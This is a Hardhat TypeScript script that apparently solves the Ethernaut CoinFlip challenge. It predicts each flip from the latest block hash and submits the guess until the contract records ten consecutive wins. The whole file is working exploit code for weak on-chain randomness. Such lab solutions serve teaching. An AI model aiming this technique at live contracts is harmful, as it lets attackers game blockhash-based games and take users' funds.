import { BigNumber } from "ethers";
import hre, { ethers } from "hardhat";
import { BLOCK_EXPLORER_URL, developmentNetworks } from "../hardhat.config";

const FACTOR = BigNumber.from("57896044618658097711785492504343953926634992332820282019728792003956564819968");
const WIN_TARGET = 10;

async function coinFlipExploit() {
  const coinFlipInstanceAddress = process.env.COINFLIP_ADDRESS!;
  const accounts = await ethers.getSigners();
  const attacker = accounts[0];

  const coinFlip = await ethers.getContractAt("CoinFlip", coinFlipInstanceAddress);
  const guess = await computeGuess();
  const tx = await coinFlip.connect(attacker).flip(guess);

  if (ethers.provider.network.name in developmentNetworks)
    console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);

  await tx.wait();

  const consecutiveWins = (await coinFlip.consecutiveWins()).toNumber();
  console.log(consecutiveWins);
  consecutiveWins == 10
    ? console.log(`SUCCESS!!! Submit the instance.`)
    : console.log(`Run ${WIN_TARGET - consecutiveWins} more times`);
}

async function computeGuess(): Promise<boolean> {
  const latestBlockNumber = await ethers.provider.getBlockNumber();
  const blockhash = (await ethers.provider.getBlock(latestBlockNumber)).hash;
  const blockValue = BigNumber.from(blockhash);
  const coinFlip = blockValue.div(FACTOR);
  return new Promise((resolve) => resolve(coinFlip.eq(1)));
}

coinFlipExploit().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
